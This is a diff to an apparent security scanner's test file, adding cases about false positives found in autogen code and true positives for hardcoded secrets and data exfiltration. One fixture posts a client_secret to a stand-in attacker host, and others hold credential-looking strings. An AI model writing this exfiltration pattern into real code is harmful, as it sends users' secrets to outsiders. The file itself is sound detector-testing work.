@@ -284,6 +284,42 @@ def run(task):
     subprocess.run(out, shell=True)
 '''}, expect=["execute"], why="real CrewAI agent output run in a shell")
 
+# ---------------- cases found by scanning microsoft/autogen (code we did not write) ----------------
+case("fp_autogen_angle_placeholders", {"client.py": '''client = Client(
+    aws_access_key="<aws_access_key>",
+    aws_secret_key="<aws_secret_key>",
+    aws_session_token="<aws_session_token>",
+    api_key="<api-key>",
+)
+'''}, forbid=["hardcoded_credential", "exposed_secret"], why="documentation placeholders in angle brackets")
+case("fp_autogen_shell_variable", {"server.py": '''SCRIPT = """jupyter kernelgateway \\\\
+    --KernelGatewayApp.auth_token="${TOKEN}" \\\\
+    --port 8888"""
+'''}, forbid=["hardcoded_credential"], why="${TOKEN} is a shell variable reference, not a value")
+case("fp_autogen_token_url_name", {"auth.py": 'token_url = "https://github.com/login/oauth/access_token"\n'},
+     forbid=["hardcoded_credential"], why="a variable named token_url holds a URL")
+case("fp_autogen_classpath_value", {"guards.ts": 'export const T = {\n  TOKEN_USAGE: "autogen_agentchat.conditions.TokenUsageTermination",\n};\n'},
+     forbid=["hardcoded_credential"], why="value is a dotted class path, name says usage")
+case("fp_autogen_oauth_exchange_via_variable", {"providers.py": '''import httpx
+async def exchange(code, cid, csecret):
+    token_url = "https://github.com/login/oauth/access_token"
+    token_data = {"client_id": cid, "client_secret": csecret, "code": code}
+    async with httpx.AsyncClient() as client:
+        return await client.post(token_url, data=token_data, headers={"Accept": "application/json"})
+'''}, forbid=["data_exfiltration"], why="OAuth exchange with the provider; URL held in a constant variable")
+case("fp_autogen_json_data_with_sample_code", {"default_gallery.json": '''{"source_code": "async def search(q):\\n    api_key = os.getenv('KEY')\\n    r = requests.post(url, json={'api_key': api_key, 'q': q})\\n    return r.text"}
+'''}, forbid=["data_exfiltration", "hardcoded_credential", "sql_injection", "unguarded_endpoint"],
+     why="JSON data file: a string that contains sample code is not running code")
+case("tp_real_secret_still_flagged_after_name_rules", {"settings.py": 'API_TOKEN = "Zr8Lm2qW9xV4nB7pT1cD6gH3"\nDB_PASSWORD = "Xk29!fQ7vLm3Zp81"\n'},
+     expect=["hardcoded_credential"], why="real-looking values under credential names must still be flagged")
+case("tp_exfil_via_variable_unknown_host", {"leak.py": '''import requests
+def go(client_secret):
+    url = "https://collector.attacker.example/in"
+    requests.post(url, json={"client_secret": client_secret})
+'''}, expect=["data_exfiltration"], why="the URL variable points at an unrelated host")
+case("tp_secret_in_json_config_still_flagged", {"config.json": '{"openai_key": "' + FAKE_PREFIX + 'proj-9fK2LmQx81ZtV7cRb4NwYd3HsJ6PaUe0"}\n'},
+     expect=["exposed_secret"], why="data files are still checked for leaked secrets")
+
 if os.path.isdir(ROOT):
     shutil.rmtree(ROOT)
 for name, c in C.items():
